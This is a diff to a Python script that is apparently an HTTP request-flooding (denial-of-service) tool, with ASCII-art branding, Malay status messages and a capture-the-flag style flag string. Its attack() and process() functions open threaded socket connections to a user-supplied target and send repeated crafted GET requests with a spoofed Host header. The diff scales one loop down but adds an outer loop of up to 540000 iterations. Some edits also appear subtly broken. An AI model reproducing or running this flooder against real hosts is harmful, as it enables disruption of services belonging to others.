@@ -1,5 +1,22 @@
 #!/usr/bin/env python3
 #
+hello = """
+                                                                      
+        .uef^"                                                        
+      :d88E                      u.    u.      u.    u.               
+      `888E             u      x@88k u@88c.  x@88k u@88c.       u     
+       888E .z8k     us888u.  ^"8888""8888" ^"8888""8888"    us888u.  
+       888E~?888L .@88 "8888"   8888  888R    8888  888R  .@88 "8888" 
+       888E  888E 9888  9888    8888  888R    8888  888R  9888  9888  
+       888E  888E 9888  9888    8888  888R    8888  888R  9888  9888  
+       888E  888E 9888  9888    8888  888R    8888  888R  9888  9888  
+       888E  888E 9888  9888   "*88*" 8888"  "*88*" 8888" 9888  9888  
+      m888N= 888> "888*""888"    ""   'Y"      ""   'Y"   "888*""888" 
+       `Y"   888   ^Y"   ^Y'                               ^Y"   ^Y'  
+            J88"                                                      
+            @%                                                        
+          :"                                                          
+"""
 import datetime, os, platform, socket, sys, uuid
 import hashlib, json, requests, threading
 from threading import Timer
@@ -34,7 +51,7 @@ admin = os.getlogin(); MAC = hex(uuid.getnode());
 deact = 'writ.er.ws'; slEEp = 0.5
 
 # parse_input
-script = sys.argv[0]; none = "";
+script = sys.argv[0]; none = ""; txt = none;
 target = none; port = none; num_requests = 0;
 
 def t1m3r():
@@ -49,7 +66,7 @@ def parse():
  else:
   sys.stdout.write(f'\r\n Usage: {sys.argv[0]} < TARGET_IP > < PORT >');
   sys.stdout.write(f'\r\n exmpl: {sys.argv[0]} 255.255.255.255 :80\n');
-  sys.stdout.flush(); reset(1); sys.exit(1);
+  sys.stdout.flush(); reset(0); sys.exit(1);
 
 # scratch.py
 #
@@ -66,7 +83,7 @@ t4rg3t = '192.168.11.17'; p0rt = 5000;
 
 def test():
  s = "Hello World"
- s = s.replace("World","Universe")
+ s = s.replace("ld","Universe")
  print(s)
 
 def colored(r,g,b,text):
@@ -75,17 +92,8 @@ def colored(r,g,b,text):
 def client(init): # platform
  client_os = platform.system(); un = platform.uname();
  client_hn = platform.node(); # hostname
- if init == 'os': return client_os
- if init == 'hn': return client_hn
-
-
-# input = sys.argv[1]
-
-#SERVER_IP = 'THE SERVER'
-#SERVER_PORT = SERVER_PORT
-#SOURCE_IP = socket.gethostname()
-#SOURCE_PORT = 57004
-#KEEP_ALIVE_INTERVAL = 5
+ if init == 'os': return client_os;
+ if init == 'hn': return client_hn;
 
 b4L = 'process'; v4L = 'kwafeLt wAS hERE';
 question = 'Do you want to continue?';
@@ -100,14 +108,6 @@ def h4sh(txt):
  str2hash = txt; result = hashlib.md5(str2hash.encode());
  digest = result.hexdigest(); return digest
 
-#import requests
-def goodns():
- url = 'https://google.com'
- headers = {'Accept': '*/*', 'X-User-IP': fake_ip}
- r = requests.get(url, headers=headers)
- for key, val in r.headers.items():
-  print(key, ':', val)
-
 def address(LAN):
  if LAN == 0:
   hostname = socket.gethostname() # getting the IP address using socket.gethostbyname() method
@@ -119,19 +119,16 @@ def address(LAN):
   addr = wifi.getsockname()[0]
  return addr
  
-
-
 def reset(init):
  os.system('setterm --foreground default --background default --cursor on');
- # os.system('clear');
  if init == 1:
-  sys.stdout.write(f'\r\n.. stopping python3 {script} {target} {port}\n');
-  sys.stdout.flush(); sys.stdout.write(f'\r\n.. T3R1M4 K4S3H ..\r\n\n');
-  sys.stdout.flush(); sys.exit(0);
+  sys.stdout.write(f'\r\n .. stopping python3 {script} {target} {port}\r\n');
+  sys.stdout.flush(); sys.stdout.write(f'\r\n .. T3R1M4 K4S3H ..\r\n\n');
+  sys.stdout.flush(); sys.exit(1);
 
 def start():
  terminal('start'); os.system('setterm --foreground black --background white --cursor on')
- os.system('clear'); print('\n',w1,'\n',w2,'\n',w3); access_code('\taccess code');
+ os.system('clear'); print(hello); access_code('\taccess code');
 
 def access_code(key):
  reply = input('\n ' + key + '\t:\t');
@@ -149,9 +146,8 @@ def access_code(key):
 def yes_or_no(question):
  reply = input('\n ' + question + ' [y/N] ');
  if reply == '' or reply[0] == 'n':
-  os.system('setterm --foreground default --background default --cursor on --store');
-  os.system('clear'); return False
- if reply[0] == 'y': pre_start(); return True
+  global txt; txt = 'CANCEL'; reset(0); os.system('clear'); return False;
+ if reply[0] == 'y': pre_start(); return False;
  else: return yes_or_no('so.. YES or NO ?');
 
 def yes_or_no_ORIG(question): # BROKEN
@@ -204,19 +200,23 @@ def print_status(status, hexd):
  if status == 'success':
   str_1 = colored(205, 163, 152, tim3)
   str_2 = colored(45 , 145, 145, b4L)
-  str_3 = colored(245, 245, 245, hexd)
-  str_4 = colored(0  , 110, 210, v4L)
-  slEEp = 1.0; print(f'',str_1,str_2,str_3,str_4); return False
+  str_3 = colored(245, 110,  45, hexd)
+  str_4 = colored(245, 245, 245, v4L)
+  slEEp = 1.0; sys.stdout.write(f'\r {str_1} {str_2} {str_3} {str_4}\r\n');
+  sys.stdout.flush(); return False;
  if status == 'failure':
   str_1 = colored(145, 145, 145, tim3);
   str_2 = colored(245, 110, 110, 'No connection > server may be down');
   str_3 = colored(205, 163, 152, '< RECONNECTING');
-  str_4 = colored(45 , 145, 145, tim4);
-  print(f'',str_1,str_2,str_3,str_4); return False
-  
+  str_4 = colored(245 , 245, 245, tim4);
+  sys.stdout.write(f'\r\n {str_1} {str_2} {str_3} {str_4}\r');
+  sys.stdout.flush();
  else:
-  sys.stdout.write('\n ' + colored(245,110,45,tim3) + colored(245,45,215,' CODE ER') + colored(245,245,245,'ROR_KOD RALAT'))
-  sys.stdout.flush()
+  str_1 = colored(245,110,45,tim3);
+  str_2 = colored(245,245,245,'!PAUSED');
+  str_3 = colored(245,45,215,'You pressed CTRL + C / Program interrupted.');
+  sys.stdout.write(f'\r\n {str_1} {str_2} {str_3}\r\n'); sys.stdout.flush();
+  reset(0);
  return status
 
 ###############################################################################
@@ -226,7 +226,7 @@ def attack():
  with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as proc:
   try:
    address = (target, port); proc.connect(address);
-   proc.sendto(('GET /' + '?w=' + hexd + ' HTTP/1.1\r\nHost: ' + deact + '\r\n').encode('ascii'), address);
+   proc.sendto(('GET /' + '?i=' + hexd + ' HTTP/1.1\r\nHost: ' + deact + '\r\n').encode('ascii'), address);
    proc.sendto(('User-Agent: ' + user_agent + '\r\nAccept-Encoding: gzip, deflate\r\n').encode('ascii'), address);
    proc.sendto(('Accept: text/plain,*/*\r\nConnection: keep-alive\r\n').encode('ascii'), address);
    proc.sendto(('Keep-Alive: timeout=15, max=100\r\n\r\n').encode('ascii'), address);
@@ -237,8 +237,10 @@ def attack():
    slEEp = 0.05; status = 'success'; # print_status('success', hexd);
   except socket.error:
    slEEp = 1.00; status = 'failure'; # print_status('failure', hexd);
+  except (IOError, OSError):
+   slEEp = 3.00; status = 'OSError'; hexd = 'dalam socket';
   except (KeyboardInterrupt, SystemExit):
-   reset(); status = 'reset'; print('\r\n','..EXIT');
+   status = 'numb'; print('\r\n','..EXIT');
   finally:
    print_status(status, hexd);# Timer(slEEp,process).start();
    #process();
@@ -248,25 +250,41 @@ def attack():
 
 def process():
  try:
-  for i in range(50000):#500
+  for i in range(10):# 500
    time.sleep(slEEp);
    thread = threading.Thread(target=attack);
    thread.start();
+ except (IOError, OSError):
+  print('OSError');
  except (KeyboardInterrupt, SystemExit):
-  sys.stdout.write(f'\r / CTRL-C / PRESSED\r\n'); sys.stdout.flush();
-  reset(1);
+  time.sleep(0.5); global txt; txt = '.. CTRL-C / PRESSED';
+  reset(0);
+
+def process_steady():
+ i = 1;
+ while (i < 540000):
+  process();# attack();
+  if (i == 3):
+   time.sleep(0.5)
+   global txt; txt = '.. FINN / CTF{h4nn4_s0f34}';
+   reset(0); break
+  i += 1
 
 def verify():
  try:
   r = socket.gethostbyname(target);
   s = socket.create_connection((r, port), 2)
-  process();
- except:
-  reset(1);
+  process_steady();
+ except (IOError, OSError):
+  global txt; txt = '.. SYSTEM LOCKDOWN / SERVER OFFLINE';
+  reset(0);
+ except (KeyboardInterrupt, SystemExit):
+  reset(0);
 
 ###############################################################################
 
 try: parse(); reset(0);
-except (KeyboardInterrupt, SystemExit): reset(0);
-finally: reset(0); sys.exit(0);
+except (IOError, OSError): print('main_OSError');
+except (KeyboardInterrupt, SystemExit): sys.stdout.write(f'\r\n {txt}\r\n'); sys.stdout.flush();
+finally: reset(1); test(); sys.exit(0);
 # TERIMA KASEH~
